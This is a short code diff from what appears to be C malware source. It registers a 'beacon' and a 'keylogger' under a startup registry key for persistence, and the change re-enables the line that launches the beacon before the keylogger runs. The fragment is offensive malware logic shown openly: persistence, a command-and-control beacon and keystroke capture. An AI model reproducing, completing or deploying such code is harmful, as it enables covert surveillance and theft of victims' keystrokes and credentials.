@@ -25,9 +25,9 @@ int main() {
     write_to_startup_regkey("beacon", beacon_dst_path);
     write_to_startup_regkey("keylogger", keylogger_dst_path);
 
-    // return_val = run_command(beacon_dst_path);
-    // if (return_val != 0) {
-    //     return return_val;
-    // }
+    return_val = run_command(beacon_dst_path);
+    if (return_val != 0) {
+        return return_val;
+    }
     return run_command(keylogger_dst_path);
 }
